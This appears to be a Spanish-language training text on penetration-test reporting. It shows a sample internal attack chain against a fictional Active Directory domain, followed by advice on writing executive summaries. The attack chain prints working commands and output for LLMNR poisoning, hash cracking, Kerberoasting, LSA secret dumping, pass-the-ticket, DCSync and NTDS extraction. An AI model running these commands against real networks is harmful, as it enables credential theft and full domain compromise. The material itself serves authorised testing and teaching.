La cadena de ataque es nuestra oportunidad de mostrar la cadena de explotación genial que tomamos para ganar un punto de apoyo, movernos lateralmente y comprometer el dominio. Puede ser un mecanismo útil para ayudar al lector a conectar los puntos cuando se utilizan múltiples hallazgos en conjunto entre sí y obtener una mejor comprensión de por qué ciertos hallazgos reciben la calificación de gravedad que se les asigna. Por ejemplo, un hallazgo particular por sí solo puede ser `medium-risk` pero, combinado con uno o dos otros problemas, podría elevarlo a `high-risk`y esta sección es nuestra oportunidad de demostrar eso. Un ejemplo común es usar `Responder`para interceptar el tráfico NBT-NS/LLMNR y retransmitirlo a hosts donde la firma SMB no está presente. Puede ser realmente interesante si se pueden incorporar algunos hallazgos que de otro modo podrían parecer intrascendentes, como usar una divulgación de información de algún tipo para ayudarlo a guiarlo a través de un LFI para leer un archivo de configuración interesante, iniciar sesión en una aplicación externa y aprovechar la funcionalidad para obtener la ejecución remota de código y un punto de apoyo dentro de la red interna.

Hay varias maneras de presentar esto, y su estilo puede diferir, pero vamos a caminar a través de un ejemplo. Comenzaremos con un resumen de la cadena de ataque y luego caminaremos a través de cada paso junto con la salida de comando de soporte y capturas de pantalla para mostrar la cadena de ataque lo más claramente posible. Una ventaja aquí es que podemos reutilizar esto como evidencia de nuestros hallazgos individuales para que no tengamos que formatear las cosas dos veces y podamos copiarlas/pegarlas en el hallazgo relevante.

Empecemos. Aquí asumiremos que fuimos contratados para realizar una Prueba de Penetración Interna contra la empresa `Inlanefreight` con una VM dentro de la infraestructura del cliente o en su oficina en nuestra computadora portátil conectada a un puerto ethernet. Para nuestros propósitos, esta evaluación simulada se realizó a partir de `non-evasive` punto de vista con un `grey box` enfoque, lo que significa que el cliente no estaba tratando activamente de interferir con las pruebas y solo proporcionaba rangos de red dentro del alcance y nada más. Pudimos comprometer el dominio interno `INLANEFREIGHT.LOCAL` durante nuestra evaluación.

Nota: También se puede encontrar una copia de esta cadena de ataque en el documento de informe de muestra adjunto.

---

## Cadena de Ataque de Muestra - INLANEFREIGHT.LOCAL Prueba de Penetración Interna

Durante la Prueba de Penetración Interna realizada contra Inlanefreight, el probador se afianzó en la red interna, se movió lateralmente y finalmente comprometió la `INLANEFREIGHT.LOCAL`Dominio de Active Directory. El siguiente tutorial ilustra los pasos tomados para pasar de un usuario anónimo no autenticado en la red interna al acceso a nivel de Administrador de dominio. La intención de esta cadena de ataque es demostrar a Inlanefreight el impacto de cada vulnerabilidad que se muestra en este informe y cómo encajan para demostrar el riesgo general para el entorno del cliente y ayudar a priorizar los esfuerzos de remediación (es decir, parchear dos fallas rápidamente podría romper la cadena de ataque mientras la compañía trabaja para remediar todos los problemas informados). Mientras que otros hallazgos mostrados en este informe podrían aprovecharse para obtener un nivel similar de acceso, esta cadena de ataque muestra el camino inicial de menor resistencia tomado por el probador para lograr un compromiso de dominio.

1. El probador utilizó el [Respondedor](https://github.com/lgandx/Responder) herramienta para obtener un hash de contraseña NTLMv2 para un usuario de dominio, `bsmith`.
    
2. Este hash de contraseña se descifró con éxito fuera de línea utilizando el [Hashcat](https://github.com/hashcat/hashcat) herramienta para revelar la contraseña de texto claro del usuario, que otorgó un punto de apoyo en el `INLANEFREIGHT.LOCAL` dominio, pero sin más privilegios que un usuario de dominio estándar.
    
3. El probador luego corrió el [BloodHound.p](https://github.com/fox-it/BloodHound.py) herramienta, una versión de Python de la popular [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) herramienta de recopilación para enumerar el dominio y crear representaciones visuales de rutas de ataque. Tras la revisión, el probador descubrió que existían múltiples usuarios privilegiados en el dominio configurado con Nombres Principales de Servicio (SPN), que se pueden aprovechar para realizar un ataque de Kerberoasting y recuperar tickets de TGS Kerberos para las cuentas que se pueden descifrar sin conexión `Hashcat` si se establece una contraseña débil. Desde aquí, el probador usó el [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) herramienta para llevar a cabo un ataque Kerberoasting dirigido contra el `mssqlsvc` cuenta, habiendo encontrado que el `mssqlsvc` la cuenta tenía derechos de administrador local sobre el host `SQL01.INLANEFREIGHT.LOCAL`que era un objetivo interesante en el dominio.
    
4. El probador descifró con éxito la contraseña de esta cuenta fuera de línea, revelando el valor en texto claro.
    
5. El probador autenticado al anfitrión `SQL01.INLANEFREIGHT.LOCAL` y recuperó una contraseña en texto claro del registro del host descifrando los secretos de LSA para una cuenta (`srvadmin`), que se configuró para autologon.
    
6. Esto `srvadmin` la cuenta tenía derechos de administrador local sobre todos los servidores (aparte de Controladores de dominio) en el dominio, por lo que el probador inició sesión en el `MS01.INLANEFREIGHT.LOCAL` aloje y recupere un ticket Kerberos TGT para un usuario conectado, `pramirez`. Este usuario era parte de la `Tier I Server Admins` grupo, que otorgó la cuenta DCSync derechos sobre el objeto de dominio. Este ataque se puede utilizar para recuperar el hash de contraseña NTLM para cualquier usuario en el dominio, lo que resulta en un compromiso y persistencia del dominio a través de un Golden Ticket.
    
7. El probador usó el [Rubeus](https://github.com/GhostPack/Rubeus) herramienta para extraer el ticket Kerberos TGT para el `pramirez` usuario y realizar un ataque Pass-the-Ticket para autenticarse como este usuario.
    
8. Finalmente, el probador realizó un ataque DCSync después de autenticarse con éxito con esta cuenta de usuario a través del [Mimikatz](https://github.com/gentilkiwi/mimikatz) herramienta, que terminó en compromiso de dominio.
    

#### Los pasos detallados de reproducción para esta cadena de ataque son los siguientes:

Al conectarse a la red, el probador inició la herramienta Responder y pudo capturar un hash de contraseña para el `bsmith` usuario suplantando tráfico NBT-NS/LLMNR en el segmento de red local.

#### Respondedor

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$  sudo responder -I eth0 -wrfv

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

 <SNIP>

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.195.168]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TWWXTGD94CV]
    Responder Domain Name      [3BKZ.LOCAL]
    Responder DCE-RPC Port     [47032]

[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 192.168.195.205
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
[SMB] NTLMv2-SSP Hash     : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FAAA50000000002000800330042004B005A0001001E00570049004E002D005400570057005800540047004400390034004300560004003400570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D801060004000200000008003000300000000000000001000000002000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310036003800000000000000000000000000

<SNIP>
```

El probador tuvo éxito en "craquear" este hash de contraseña fuera de línea utilizando la herramienta Hashcat y recuperando el valor de la contraseña en texto claro, otorgando así un punto de apoyo para enumerar el dominio de Active Directory.

#### Hashcat

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a002e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f846a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED>
```

El probador procedió a enumerar las cuentas de usuario configuradas con Nombres Principales de Servicio (SPN) que pueden estar sujetas a un ataque de Keberoasting. Esta técnica de escalado de movimiento/privilegio lateral se dirige a los SPN (identificadores únicos que Kerberos utiliza para asignar una instancia de servicio a una cuenta de servicio). Cualquier usuario de dominio puede solicitar un ticket Kerberos para cualquier cuenta de servicio en el dominio, y el ticket se cifra con el hash de contraseña NTLM de la cuenta de servicio, que potencialmente se puede "craquear" fuera de línea para revelar el valor de contraseña en texto claro de la cuenta.

#### GetUserSPN

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                         Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
-------------------------------------------  ---------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433      mssqlsvc             2022-05-13 16:52:07.280623  <never>               
MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod              2022-05-13 16:54:52.889815  <never>               
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev               2022-05-13 16:54:57.905315  <never>               
MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                2022-05-13 16:55:03.421004  <never>               
backupjob/veam001.inlanefreight.local        backupjob            2022-05-13 18:38:17.740269  <never>               
vmware/vc.inlanefreight.local                vmwaresvc            2022-05-13 18:39:10.691799  <never> 
```

Luego, el probador ejecutó la versión de Python de la popular herramienta de enumeración de BloodHound Active Directory para recopilar información como usuarios, grupos, computadoras, ACL, membresía de grupo, propiedades de usuario y computadora, sesiones de usuario, acceso de administrador local y más. Estos datos se pueden importar a una herramienta GUI para crear representaciones visuales de las relaciones dentro del dominio y trazar "rutas de ataque" que se pueden usar para moverse lateralmente o escalar privilegios dentro de un dominio.

#### Bloodhound

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 503 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 652 users

<SNIP>
```

El probador utilizó esta herramienta para verificar los privilegios de cada una de las cuentas SPN enumeradas en pasos anteriores y notó que solo el `mssqlsvc` la cuenta tenía privilegios más allá de un usuario de dominio estándar. Esta cuenta tenía acceso de administrador local a través del `SQL01` anfitrión. Los servidores SQL a menudo son objetivos de alto valor en un dominio, ya que tienen credenciales privilegiadas, datos confidenciales o incluso pueden tener un usuario más privilegiado conectado.

![Diagrama que muestra la conexión de MSSQLSVC@INLANEFREIGHT.LOCALl a SQL01.INLANEFREIGHT.LOCAL etiquetado 'AdminTo'.](https://academy.hackthebox.com/storage/modules/162/bh_mssqlsvc.png)

El probador luego realizó un ataque Kerberoasting dirigido para recuperar el boleto Kerberos TGS para el `mssqlsvc` cuenta de servicio.

#### GetUserSPN

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------------  --------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433  mssqlsvc            2022-05-13 16:52:07.280623  <never>               


$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a3988485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c44ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf68286ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a897185716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP>
```

El probador tuvo éxito en "craquear" esta contraseña fuera de línea para revelar su valor en texto claro.

#### Hashcat

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<SNIP>:<REDACTED>
```

Esta contraseña podría ser utilizada para acceder al `SQL01` aloje de forma remota y recupere un conjunto de credenciales en texto claro del registro para el `srvadmin` cuenta.

#### CrackMapExec

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa

SMB         192.168.195.220 445    SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.195.220 445    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc:<REDACTED> 
SMB         192.168.195.220 445    SQL01            [+] Dumping LSA secrets
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC450c5e8cb53228cc0
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547caffff5f

<SNIP>

SMB         192.168.195.220 445    SQL01            INLANEFREIGHT\srvadmin:<REDACTED>

<SNIP>

SMB         192.168.195.220 445    SQL01            [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached
```

Usando estas credenciales, el probador inició sesión en el `MS01` host a través de Escritorio remoto (RDP) y señaló que otro usuario `pramirez`, también se ha iniciado sesión actualmente.

#### Usuarios Iniciados sesión

  Componentes de un Informe

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 pramirez              rdp-tcp#1           2  Active          3  5/14/2022 8:21 AM
>srvadmin              rdp-tcp#2           3  Active          .  5/14/2022 8:24 AM
```

El probador verificó la herramienta BloodHound y notó que este usuario podía realizar el ataque DCSync, una técnica para robar la base de datos de contraseñas de Active Directory aprovechando un protocolo utilizado por los controladores de dominio para replicar datos de dominio. Este ataque se puede utilizar para recuperar hashes de contraseña NTLM para cualquier usuario en el dominio.

![Diagrama que muestra la conexión de PRAMIREZ@INLANEFREIGHT.LOCALl a INLANEFREIGHT.LOCAL con las etiquetas 'GetChangesAll' y 'GetChanges'.](https://academy.hackthebox.com/storage/modules/162/bh_pramirez.png)

Después de conectarse, el probador utilizó la herramienta Rubeus para ver todos los boletos de Kerberos actualmente disponibles en el sistema y notó que los boletos para el `pramirez` el usuario estuvo presente.

#### Rubeus

  Componentes de un Informe

```powershell-session
PS C:\htb> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x256aef

 ------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                       | Service                                           | EndTime              |
 ------------------------------------------------------------------------------------------------------------------------
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:24:19 PM |
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL                     | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01                                         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM 
```

Luego, el probador utilizó esta herramienta para recuperar el ticket Kerberos TGT para este usuario, que luego se puede usar para realizar un ataque "pasar el ticket" y usar el ticket TGT robado para acceder a los recursos en el dominio.

  Componentes de un Informe

```powershell-session
PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1a8b19
[*] Current LUID    : 0x256aef

  UserName                 : pramirez
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x1a8b19
  UserSID                  : S-1-5-21-1666128402-2659679066-1433032234-1108
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 5/14/2022 8:21:35 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : pramirez@INLANEFREIGHT.LOCAL


    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  pramirez
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  5/15/2022 3:51:35 AM
    EndTime                  :  5/15/2022 1:51:35 PM
    RenewTill                :  5/21/2022 8:21:35 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
    Base64EncodedTicket   :

      doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP>

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

El usuario realizó el ataque de pase del boleto y se autenticó con éxito como el `pramirez` usuario.

  Componentes de un Informe

```powershell-session
PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
```

Esto se confirmó usando el `klist` comando para ver tickets de Kerberos en caché en la sesión actual.

#### Entradas Kerberos en caché

  Componentes de un Informe

```powershell-session
PS C:\htb> klist

Current LogonId is 0:0x256d1d

Cached Tickets: (1)

#0>     Client: pramirez @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/15/2022 3:51:35 (local)
        End Time:   5/15/2022 13:51:35 (local)
        Renew Time: 5/21/2022 8:21:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Luego, el probador utilizó este acceso para realizar un ataque DCSync y recuperar el hash de contraseña NTLM para la cuenta de administrador incorporada, lo que llevó al acceso de nivel de Administrador de Enterprise sobre el dominio.

#### Mimikatz

  Componentes de un Informe

```powershell-session
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[DC] ms-DS-ReplicationEpoch is: 1

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/12/2022 9:32:55 PM
Object Security ID   : S-1-5-21-1666128402-2659679066-1433032234-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```

El probador confirmó este acceso autenticándose en un Controlador de Dominio en el `INLANEFREIGHT.LOCAL` dominio.

#### CrackMapExec

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2

SMB         192.168.195.204 445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.195.204 445    DC01             [+] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 
```

Con este acceso, fue posible recuperar los hashes de contraseña NTLM para todos los usuarios en el dominio. El probador realizó entonces el craqueo fuera de línea de estos hashes usando la herramienta Hashcat. Un análisis de contraseña de dominio que muestra varias métricas se puede encontrar en los apéndices de este informe.

#### Dumping NTDS con SecretsDump

  Componentes de un Informe

```shell-session
vcrdcr@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c:::
mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1:::
srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0:::
pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58:::

<SNIP>
```

---

## Escribiendo un Fuerte Resumen Ejecutivo

El `Executive Summary` es una de las partes más importantes del informe. Como se mencionó anteriormente, nuestros clientes están pagando en última instancia por el informe entregable que tiene varios propósitos además de mostrar debilidades y pasos de reproducción que pueden ser utilizados por los equipos técnicos que trabajan en la remediación. Es probable que el informe sea visto en alguna parte por otras partes interesadas internas, como Auditoría Interna, gestión de TI y seguridad de TI, gestión de nivel C e incluso la Junta Directiva. El informe puede utilizarse para validar la financiación del año anterior para infosec o para solicitar financiación adicional para el año siguiente. Por esta razón, debemos asegurarnos de que haya contenido en el informe que pueda ser fácilmente comprendido por personas sin conocimientos técnicos.

#### Conceptos Clave

La audiencia prevista para el `Executive Summary` es típicamente la persona que va a ser responsable de asignar el presupuesto para solucionar los problemas que descubrimos. Para bien o para mal, es probable que algunos de nuestros clientes hayan estado tratando de obtener fondos para solucionar los problemas presentados en el informe durante años y tengan la intención de usar el informe como munición para finalmente hacer algunas cosas. Esta es nuestra mejor oportunidad para ayudarlos. Si perdemos nuestra audiencia aquí y hay limitaciones presupuestarias, el resto del informe puede convertirse rápidamente en inútil. Algunas cosas clave a asumir (que pueden o no ser ciertas) para maximizar la efectividad de la `Executive Summary` son:

- Debería ser obvio, pero esto debería escribirse para alguien que no es técnico en absoluto. El barómetro típico para esto es "si tus padres no pueden entender cuál es el punto, entonces debes intentarlo de nuevo" (suponiendo que tus padres no son CISO o administradores de sistemas o algo por el estilo).
    
- El lector no hace esto todos los días. No saben lo que hace Rubeus, lo que significa rociar contraseñas, o cómo es posible que los boletos puedan otorgar diferentes boletos (o probablemente incluso qué es un boleto, aparte de un pedazo de papel para ingresar a un concierto o un juego de pelota).
    
- Esta puede ser la primera vez que han pasado por una prueba de penetración.
    
- Al igual que el resto del mundo en la era de la gratificación instantánea, su capacidad de atención es pequeña. Cuando lo perdemos, es extraordinariamente poco probable que lo recuperemos.
    
- En la misma línea, a nadie le gusta leer algo donde tienen que buscar en Google lo que significan las cosas. Esas se llaman distracciones.
    

Hablemos de una lista de "hacer y no hacer" al escribir un efectivo `Executive Summary`.

#### Hacer

- `When talking about metrics, be as specific as possible.`- Palabras como "varias", "múltiples", y "pocos" son ambiguas y podrían significar 6 o 500. Los ejecutivos no van a revisar el informe para obtener esta información, así que si vas a hablar sobre esto, hágales saber lo que tiene; de lo contrario, perderá su atención. La razón más común por la que las personas no se comprometen con un número específico es dejarlo abierto en caso de que el consultor se haya perdido uno. Puede realizar cambios menores en el idioma para tener en cuenta esto, como "si bien puede haber instancias adicionales de X, en el tiempo asignado a la evaluación, observamos 25 ocurrencias de X".
    
- `It's a summary. Keep it that way.`- Si escribió más de 1.5-2 páginas, probablemente haya sido demasiado detallado. Examine los temas de los que habló y determine si pueden colapsarse en categorías de nivel superior que podrían caer en políticas o procedimientos específicos.
    
- `Describe the types of things you managed to access`Es posible que su audiencia no tenga idea de lo que significa "Administrador de Dominio", pero si menciona que obtuvo acceso a una cuenta que le permitió obtener documentos de Recursos Humanos, sistemas bancarios y otros activos críticos, eso es universalmente comprensible.
    
- `Describe the general things that need to improve to mitigate the risks you discovered.`- Esto no debería ser "instalar 3 parches y llamarme en un año". Debería pensar en términos de "qué proceso se rompió que permitió que una vulnerabilidad de cinco años quedara sin parches en una cuarta parte del entorno?". Si rocía contraseñas y obtiene 500 visitas en Welcome1!, cambiar las contraseñas de esas 500 cuentas es solo una parte de la solución. La otra parte probablemente esté proporcionando al Help Desk una forma de establecer contraseñas iniciales más sólidas de manera eficiente.
    
- `If you're feeling brave and have a decent amount of experience on both sides, provide a general expectation for how much effort will be necessary to fix some of this.`Si tiene un largo pasado como administrador de sistemas o ingeniero y sabe cuánta política interna la gente puede tener que recorrer para comenzar a manipular las políticas grupales, es posible que desee tratar de establecer una expectativa de niveles bajos, moderados y significativos de tiempo y esfuerzo para corregir los problemas por lo tanto, un CEO demasiado entusiasta no le dice a su equipo de servidores que deben aplicar plantillas de endurecimiento CIS a sus GPO durante el fin de semana sin probarlas primero.
    

#### No

- `Name or recommend specific vendors.`- El entregable es un documento técnico, no un documento de ventas. Es aceptable sugerir tecnologías como EDR o agregación de registros, pero manténgase alejado de recomendar proveedores específicos de esas tecnologías, como CrowdStrike y Splunk. Si tiene experiencia con un proveedor en particular que es reciente y se siente cómodo dando al cliente esa retroalimentación, hágalo fuera de banda y asegúrese de que tiene claro que debe tomar su propia decisión (y probablemente traer ejecutivo de cuenta del cliente en esa discusión). Si describe vulnerabilidades específicas, es más probable que su lector reconozca algo como "vendedores como VMWare, Apache y Adobe" en lugar de "vSphere, Tomcat y Acrobat."
    
- `Use Acronyms.`IP y VPN han alcanzado un nivel de ubicuidad que tal vez estén bien, pero el uso de acrónimos para protocolos y tipos de ataques (por ejemplo, SNMP, MitM) es sordo al tono y hará que su resumen ejecutivo sea completamente ineficaz para su audiencia prevista.
    
